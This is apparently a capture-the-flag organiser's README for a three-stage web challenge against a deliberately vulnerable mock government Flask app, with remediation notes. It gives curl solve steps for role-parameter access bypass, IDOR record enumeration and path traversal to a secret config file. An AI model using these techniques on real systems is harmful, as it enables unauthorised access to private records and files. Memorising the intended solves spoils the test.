# 13 — LankaGov e-Services · Web (chained, tie-break) · 150+200+250 = 600 pts

A 3-stage linked series added mid-event to separate teams tied at the 600-point
ceiling. Self-contained Flask app (`c13-lankagov`, port 8013), no cloud deps.
Each stage is its own CTFd card, gated by the previous via `requirements`.

## Intended solve

**Stage 1 — Front Door (150) · broken access control**
```sh
curl http://<vm-ip>:8013/robots.txt                       # -> Disallow: /api/internal/
curl 'http://<vm-ip>:8013/api/internal/notices'           # 403 (role=citizen)
curl 'http://<vm-ip>:8013/api/internal/notices?role=officer'
# notices reveal FLAG1 (audit marker) AND the staff API key
```

**Stage 2 — Records Room (200) · IDOR**
```sh
K=<staff key from stage 1>
curl -H "X-Staff-Key: $K" http://<vm-ip>:8013/api/applications/1001   # your own
# no ownership check — enumerate ids; the sealed record is #4471:
curl -H "X-Staff-Key: $K" http://<vm-ip>:8013/api/applications/4471   # internal_note = FLAG2
# it references document "sealed_4471.pdf"
```

**Stage 3 — The Vault (250) · path traversal**
```sh
K=<staff key>
curl -H "X-Staff-Key: $K" 'http://<vm-ip>:8013/api/documents?file=sealed_4471.pdf'  # normal read
# the join isn't contained — traverse to the master config:
curl -H "X-Staff-Key: $K" 'http://<vm-ip>:8013/api/documents?file=../secret/vault.conf'
# vault_master=FLAG3
```

## Infra & safety
- Single Flask/gunicorn container on the `challenges` docker network (isolated
  from CTFd/db/cache). Flags injected at start by `docker-entrypoint.sh` from
  `FLAG_13_1/2/3` — never in an image layer or git. FLAG3 exists only in
  `secret/vault.conf`, reachable solely via the Stage 3 traversal.
- The staff key is generated per container start and shared across workers via
  an exported env var (so the Stage 1 -> 2 chain is stable).

## Remediation (maps to the Blue Team Brief)
- **S1:** never trust a client-supplied role; authorise on the server.
- **S2:** enforce object-level ownership (this record belongs to this user).
- **S3:** never join user input onto a path; canonicalise and confine to the
  base dir (`os.path.realpath` + prefix check), or serve by allow-listed id.
